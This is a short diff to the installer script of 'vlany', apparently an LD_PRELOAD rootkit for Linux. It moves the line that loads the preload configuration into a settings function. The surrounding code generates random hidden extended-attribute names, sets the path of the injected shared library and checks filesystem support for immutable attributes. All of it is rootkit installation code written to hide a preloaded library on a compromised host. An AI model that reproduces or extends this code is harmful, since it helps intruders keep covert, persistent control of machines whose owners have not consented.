@@ -29,8 +29,6 @@ CHATTR_OUTPUT=$(touch children; chattr +ia children &>output; cat output)
 [[ $CHATTR_OUTPUT == *"Inappropriate ioctl"* ]] && { read -p "Warning: You're attempting to install vlany on a weird/alien filesystem. This is bad. Bailing."; exit; }
 chattr -ia children &>/dev/null; rm -f children output
 
-NEW_PRELOAD=$(cat new_preload)
-
 install_vlany_prerequisites ()
 {
     if [ -f /usr/bin/yum ]; then
@@ -174,6 +172,7 @@ get_vlany_settings ()
     HIDDEN_XATTR_1_STR="$(cat /dev/urandom | tr -dc 'A-Za-z' | fold -w 32 | head -n 1)"
     HIDDEN_XATTR_2_STR="$(cat /dev/urandom | tr -dc 'A-Za-z' | fold -w 32 | head -n 1)"
     LIB_LOCATION="${INSTALL}/${OBJECT_FILE_NAME}.so.\$PLATFORM"
+    NEW_PRELOAD=$(cat new_preload)
 }
 
 config_vlany ()
